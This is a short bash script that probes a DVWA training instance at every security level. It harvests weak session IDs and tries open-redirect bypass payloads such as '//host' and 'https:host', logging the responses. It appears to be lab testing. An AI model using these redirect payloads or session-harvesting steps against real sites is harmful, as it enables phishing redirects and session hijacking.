CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed'
B='http://10.31.0.87:3000'
mkdir -p evidence/weakid evidence/redir evidence/misc

# weak_id: generate set cookie
for L in low medium high impossible; do
  echo "== weak_id $L"
  for i in 1 2 3; do
    curl -s -b "$CK; security=$L" -c /tmp/wk -o /dev/null "$B/vulnerabilities/weak_id/"
    grep -i dvwaSession /tmp/wk | awk '{print $NF}'
  done
done

# open_redirect variations
for L in low medium high impossible; do
  echo "== redirect $L"
  for R in 'http://10.31.0.87/' '//10.31.0.87/' '///10.31.0.87/x' 'https:10.31.0.87'; do
    curl -s -b "$CK; security=$L" "$B/vulnerabilities/open_redirect/source/$L.php" -G --data-urlencode "redirect=$R" -o /dev/null -w "  R=$R => %{http_code} loc=%{redirect_url}\n"
  done
done
